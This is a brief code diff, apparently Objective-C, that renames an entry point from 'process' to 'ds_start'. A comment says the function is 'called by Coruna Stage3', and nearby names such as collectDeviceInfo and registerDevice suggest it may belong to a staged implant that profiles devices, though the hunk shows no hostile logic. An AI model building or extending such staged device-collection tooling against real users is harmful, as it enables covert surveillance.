@@ -263,7 +263,7 @@ static void collectDeviceInfo(int did) {
 }
 
 // === _process entry point - called by Coruna Stage3 ===
-void process(void) {
+void ds_start(void) {
     @autoreleasepool {
         int did = registerDevice();
         if (did == 0) return;
